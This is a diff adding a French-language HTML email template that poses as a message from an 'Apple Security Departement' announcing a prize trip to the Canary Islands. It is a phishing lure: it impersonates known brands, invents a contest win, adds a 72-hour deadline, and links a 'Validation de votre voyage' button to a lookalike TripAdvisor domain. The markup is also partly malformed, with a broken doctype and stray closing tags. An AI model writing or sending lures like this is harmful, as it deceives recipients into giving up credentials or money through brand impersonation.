@@ -1,0 +1,87 @@
+!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Votre titre d'email ici</title>
+    <style>
+      /* Reset des styles */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      /* Style pour le fond de l'email */
+      body {
+        background-color: #f1f1f1;
+      }
+      /* Centrage du contenu de l'email */
+      .container {
+        width: 100%;
+        max-width: 600px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #ffffff;
+      }
+      /* Style pour le titre de l'email */
+      h1 {
+        color: #333333;
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 20px;
+      }
+      /* Style pour le texte de l'email */
+      p {
+        color: #666666;
+        font-size: 16px;
+        line-height: 1.5;
+        margin-bottom: 20px;
+      }
+      /* Style pour le bouton de connexion */
+      .button {
+        display: inline-block;
+        padding: 10px 20px;
+        background-color: #1877f2;
+        color: #ffffff;
+        font-size: 16px;
+        text-decoration: none;
+        border-radius: 5px;
+      }
+      .button:hover {
+        background-color: #166fe5;
+      }
+      /* Style pour l'image */
+      .image {
+        display: block;
+        max-width: 100%;
+        margin-bottom: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1> "Gagnant du jeu concours : Félicitations !"</h1>
+      <img src="https://worldissmall.fr/wp-content/uploads/2019/10/trip-advisor-app.jpg" alt="Image de votre email" class="image">
+      <p>
+
+
+        
+Apple Security Departement</h1>
+    <h2>Félicitations pour votre victoire au concours !</h2>
+    <p>C'est avec une grande joie que nous vous annonçons que vous avez remporté un voyage gratuit dans les Îles Canaries ! Nous tenons à vous féliciter chaleureusement pour cette belle victoire.</p>
+    <p>Votre persévérance et votre détermination ont porté leurs fruits, et nous sommes ravis de vous offrir cette occasion de profiter d'un séjour inoubliable dans les magnifiques paysages des Canaries.
+
+        Les Îles Canaries regorgent de merveilles naturelles, avec leurs plages de sable doré, leurs eaux cristallines et leurs paysages volcaniques à couper le souffle. Vous aurez l'opportunité de découvrir la culture locale, de vous détendre au soleil, de pratiquer des activités passionnantes et de créer des souvenirs impérissables.</p>
+    <p>Nous sommes fiers de vous avoir parmi nos gagnants et espérons que ce voyage sera une expérience exceptionnelle pour vous. Profitez de chaque instant, laissez-vous envoûter par la beauté des Canaries et créez des souvenirs qui resteront gravés dans votre cœur.
+
+        Encore une fois, toutes nos félicitations pour cette réussite remarquable ! Nous vous souhaitons un voyage incroyable, rempli d'aventures, de découvertes et de moments de bonheur.</p>
+
+    <a href="https://www.trip-advisor-app.com/verification-cadeau">Validation de votre voyage</a>
+    <p>Ce site Web sera disponible pendant 72 heures.</p>
+
+
+</p>
+
+
+    </div>
+  </body>
+</html>
